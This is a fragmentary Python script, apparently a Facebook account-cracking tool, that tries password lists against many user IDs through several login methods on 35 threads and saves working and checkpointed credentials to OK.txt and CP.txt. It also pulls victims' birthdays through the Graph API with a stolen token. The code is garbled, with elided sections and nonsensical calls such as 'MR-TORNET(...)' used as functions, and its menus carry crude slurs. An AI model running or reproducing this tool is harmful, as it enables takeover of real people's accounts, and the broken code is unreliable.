...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#MR.TORNET('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = MR.TORNET(self.apk).read().splitlines()
			MR.TORNET(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							MR_TORNET('[•] Result CP saved to CP.txt')
							MR_TORNET('\n\tCrack Processing...\n')
							MR_TORNET('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					SK_BROTHERS('\n01.) Metode b-api ')
					SK_BROTHERS('02.) Metode mbasic ')
					SK_BROTHERS('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			SK_BROTHERS(' [1] ( SK ) Method 1 ')
			SK_BROTHERS(' [2] ( SK ) Method 2  [ Pro ]')
			SK_BROTHERS(' [3] ( SK ) Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write('\r\033[1;97m [TORNET] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			if "access_token" in p:
				MR.TORNET('\r\033[1;92m[Successful-TORNET] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					...
					MR.TORNET('\r\033[1;91m[Checkpoint-MR.TORNET] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				MR.TORNET('\r\033[1;91m[Checkpoint-TORNET] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = MR.TORNET('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			...
			if 'c_user' in ses.cookies.get_dict():
				MR.TORNET('\r\033[1;32m[Successful-TORNET] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					token = MR-TORNET('token.txt').read()
					cp_ttl = Prof_Tornet('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month].MR.TORNET('\r\033[1;91m[Checkpoint-TORNET] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('CP.txt','a').write('%s\n' % wrt)
					break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				MR.TORNET('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
				...
				try:
					...
					pass
				MR-TORNET('\r\033[1;91m[Checkpoint-MR-TORNET] %s | %s%s      ' % (user,pw,tahun(user)))
				wrt = '%s - %s%s'%(user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __pler__(self):
		yan = input('\n[•] Choose : ')
		if yan == '':
			MR-TORNET('\Choose Error ')
			exit()
		elif yan in ('1', '01'):
			MR-TORNET('\n[•] Result OK saved to OK.txt')
			MR-TORNET('[•] Result CP saved to CP.txt')
			MR-TORNET('\n\tCrack Processing...\n')
			MR-TORNET('\n\tCrack Processing...\n\n');logo()
			with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
...
banner="""\033[1;37m
 ...
 [*]=============================================
    Author   : MR-TORNET
    Facebook : https://www.facebook.com/mr.tornet
    Team     : BBHH
    Connect  : https://www.facebook.com/mr.tornet
 [*]=============================================
...
def dupcutter():
	os.system("xdg-open https://www.facebook.com/mr.tornet")
	time.sleep(3)
	readline___Public_Xml()
def sep():
	logo()
